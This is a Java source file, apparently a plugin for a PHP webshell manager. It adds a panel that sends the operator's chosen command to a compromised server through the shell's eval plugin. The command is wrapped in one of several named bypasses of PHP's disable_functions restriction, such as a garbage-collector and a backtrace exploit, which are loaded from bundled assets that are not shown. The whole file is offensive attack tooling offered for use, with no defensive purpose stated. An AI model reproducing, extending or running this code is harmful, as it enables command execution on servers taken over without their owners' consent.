package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.ShellManage;
import core.ui.component.RTextArea;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;

@PluginnAnnotation(
        payloadName = "PhpDynamicPayload",
        Name = "BypassDisableFunctions"
)
public class BypassDisableFunctions implements Plugin {
    private static final String CLASS_NAME = "BypassDisableFunctions.Run";
    private static final String[] BYPASS_MEM_PAYLOAD = new String[]{"disfunpoc", "php-json-bypass", "php7-backtrace-bypass", "php7-gc-bypass", "procfs_bypass"};
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JPanel memBypassPanel = new JPanel(new BorderLayout());
    private final JPanel envPanel = new JPanel(new BorderLayout());
    private final JTabbedPane tabbedPane;
    private final JTextField commandTextField;
    private final JLabel memPayloadLabel;
    private final JLabel memCommandLabel;
    private final JButton memRunButton;
    private final RTextArea memResultTextArea;
    private final JComboBox<String> memPayloadComboBox;
    private final JSplitPane memSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private PhpEvalCode phpEvalCode;

    public BypassDisableFunctions() {
        this.memPayloadComboBox = new JComboBox<>(BYPASS_MEM_PAYLOAD);
        this.tabbedPane = new JTabbedPane();
        this.memRunButton = new JButton("Run");
        this.memResultTextArea = new RTextArea();
        this.commandTextField = new JTextField(35);
        this.memPayloadLabel = new JLabel("payload");
        this.memCommandLabel = new JLabel("command");
        this.memSplitPane = new JSplitPane();
        this.commandTextField.setAutoscrolls(true);
        this.commandTextField.setText("whoami");
        this.memSplitPane.setOrientation(0);
        JPanel memTopPanel = new JPanel();
        memTopPanel.add(this.memPayloadLabel);
        memTopPanel.add(this.memPayloadComboBox);
        memTopPanel.add(this.memCommandLabel);
        memTopPanel.add(this.commandTextField);
        memTopPanel.add(this.memRunButton);
        this.memSplitPane.setTopComponent(memTopPanel);
        this.memSplitPane.setBottomComponent(new JScrollPane(this.memResultTextArea));
        this.memBypassPanel.add(this.memSplitPane);
        this.tabbedPane.addTab("MemBypass", this.memBypassPanel);
        this.tabbedPane.addTab("EnvBypass", this.envPanel);
        this.panel.add(this.tabbedPane);
    }

    private void memRunButtonClick(ActionEvent actionEvent) {
        String payloadNameString = (String) this.memPayloadComboBox.getSelectedItem();
        String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", payloadNameString)));
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("cmd", this.commandTextField.getText());
        String resultString = this.eval(codeString, reqParameter);
        this.memResultTextArea.setText(resultString);
    }

    private String eval(String code, ReqParameter reqParameter) {
        if (this.phpEvalCode == null) {
            try {
                if (this.phpEvalCode == null) {
                    ShellManage shellManage = (ShellManage) this.shellEntity.getFrame();
                    this.phpEvalCode = (PhpEvalCode) shellManage.getPlugin("P_Eval_Code");
                }
            } catch (Exception var4) {
                JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin P_Eval_Code!");
                return "";
            }
        }

        return this.phpEvalCode.eval(code, reqParameter);
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
